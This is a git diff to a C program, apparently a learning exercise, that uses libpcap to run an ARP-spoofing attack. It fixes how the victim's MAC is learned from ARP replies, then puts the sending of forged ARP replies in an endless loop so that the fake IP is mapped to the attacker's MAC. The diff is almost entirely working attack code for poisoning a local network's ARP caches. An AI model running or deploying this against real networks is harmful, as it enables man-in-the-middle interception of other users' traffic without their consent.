@@ -142,7 +142,6 @@ void send_arp(pcap_t * handle,char * dev,struct mac_ip_info * sender, struct mac
 	memcpy(ether->ether_shost,sender->mac,6);
 	if(target->mac[0]==0){
 		memcpy(ether->ether_dhost,broadcast,ETHER_ADDR_LEN);
-		printf("2");
 	}
 	ether->ether_type=htons(ETHERTYPE_ARP); 
 	
@@ -205,17 +204,18 @@ int main(int argc, char* argv[]) {
 	printf("[*] LOCAL MAC ADDR : "); print_mac_addr(attacker->mac);
 	printf("[*] LOCAL IP ADDR : "); print_ip_addr(attacker->ip);
 	
-	send_arp(handle,dev,attacker,victim,ARP_REQ);
 	while(true){
+		send_arp(handle,dev,attacker,victim,ARP_REQ);
 		res = pcap_next_ex(handle,&header,&packet);
 		if(res == 0) continue;
 		if(res == -1 || res == -2) break;
+
 
 		ether_header = (struct ether_header *)packet;
 		if(ntohs(ether_header->ether_type) == ETHERTYPE_ARP){
 			arp_header = (struct arp*)(packet+ETHER_HEADER_SIZE);
 			if(ntohs(arp_header->oper) == ARP_REPLY){
-				if(!memcmp(arp_header->tpa,victim->ip,IPADDR_LEN)){
+				if(!memcmp(arp_header->tpa,attacker->ip,IPADDR_LEN)){
 					memcpy(victim->mac,arp_header->tha,ETHERADDR_LEN);
 					printf("[*] Victim's Mac : "); print_mac_addr(victim->mac);
 					break;
@@ -226,7 +226,10 @@ int main(int argc, char* argv[]) {
 	
 	strToip(argv[3],fake);
 	memcpy(fake->mac,attacker->mac,ETHERADDR_LEN);
-	send_arp(handle,dev,fake,victim,ARP_REPLY);
+	printf("send arp_reply....\n");
+	while(true){
+		send_arp(handle,dev,fake,victim,ARP_REPLY);
+	}
 
 /*
 	int res = pcap_next_ex(handle, &header, &packet);
